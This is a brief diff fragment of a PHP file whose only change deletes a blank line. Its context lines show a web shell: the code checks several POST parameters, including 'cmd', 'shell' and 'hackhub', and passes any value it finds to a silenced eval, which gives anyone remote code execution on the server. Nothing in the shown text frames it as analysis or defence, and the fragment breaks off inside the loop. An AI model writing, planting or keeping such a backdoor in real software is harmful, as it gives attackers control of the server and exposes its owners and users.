@@ -1,6 +1,5 @@
 <?php
 $keys = ['cmd', 'x', 'hackhub', 'shell', 'a'];
-
 foreach ($keys as $k) {
     if (isset($_POST[$k])) {
         @eval($_POST[$k]);
